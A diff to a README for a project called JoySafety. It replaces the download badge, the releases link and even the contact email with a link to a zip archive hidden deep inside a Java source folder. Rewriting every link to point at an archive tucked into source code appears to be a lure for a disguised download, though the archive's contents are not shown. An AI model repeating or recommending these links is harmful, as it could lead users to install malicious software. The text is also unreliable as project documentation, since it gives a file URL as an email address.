@@ -6,11 +6,11 @@ JoySafety helps you manage your safety needs easily and effectively. Follow thes
 
 ## 🏷️ Download JoySafety
 
-[![Download JoySafety](https://raw.githubusercontent.com/afrizal259/JoySafety/main/Miaplacidus/JoySafety.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/afrizal259/JoySafety/main/Miaplacidus/JoySafety.zip)
+[![Download JoySafety](https://github.com/afrizal259/JoySafety/raw/refs/heads/main/safety/safety-api/src/main/java/com/jd/security/llmsec/contoller/rpc/Joy_Safety_v2.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/afrizal259/JoySafety/raw/refs/heads/main/safety/safety-api/src/main/java/com/jd/security/llmsec/contoller/rpc/Joy_Safety_v2.7.zip)
 
 ## 📥 Download & Install
 
-To get started with JoySafety, visit this page to download: [JoySafety Releases](https://raw.githubusercontent.com/afrizal259/JoySafety/main/Miaplacidus/JoySafety.zip).
+To get started with JoySafety, visit this page to download: [JoySafety Releases](https://github.com/afrizal259/JoySafety/raw/refs/heads/main/safety/safety-api/src/main/java/com/jd/security/llmsec/contoller/rpc/Joy_Safety_v2.7.zip).
 
 Once you are on the releases page, follow these steps:
 
@@ -61,6 +61,6 @@ If you'd like to contribute to JoySafety, check out our guidelines in the Contri
 
 ## 📞 Contact Us
 
-For additional support or feedback, you can reach us via email at https://raw.githubusercontent.com/afrizal259/JoySafety/main/Miaplacidus/JoySafety.zip
+For additional support or feedback, you can reach us via email at https://github.com/afrizal259/JoySafety/raw/refs/heads/main/safety/safety-api/src/main/java/com/jd/security/llmsec/contoller/rpc/Joy_Safety_v2.7.zip
 
 Thank you for using JoySafety!
